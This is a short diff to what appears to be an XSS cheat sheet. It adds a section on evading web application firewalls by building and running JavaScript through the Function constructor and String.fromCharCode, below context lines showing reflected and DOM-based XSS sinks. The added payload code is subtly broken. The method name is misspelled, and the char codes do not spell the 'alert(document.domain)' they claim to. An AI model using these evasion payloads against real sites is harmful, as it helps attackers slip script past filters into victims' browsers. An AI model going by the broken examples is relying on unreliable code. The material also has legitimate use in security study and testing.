@@ -57,4 +57,18 @@ res.send(`<h1>${req.query.name}</h1>`)
 
 const name = new URLSearchParams(location.search).get('name');
 document.getElementBy...innerHtml  = `Hello, ${name}`;
+```  
+
+## WAF Evasion / JS Expression:  
 ```
+{} // Object
+{}.toString // Object function
+{}.toString.constructor // Function constructor
+{}.toString.constructor('js here') // A function dynamically constructed from string
+{}.toString.constructor('js here')() // Call function
+
+![]+[] // False
+(![]+[]).constructor // The string constructor
+(![]+[]).constructor.formCharCode // The fromCharCode method
+(![]+[]).constructor.formCharCode(97,108,101,110,116,46,100,111,10997,105,110,41) // "alert(document.domain)"
+```  
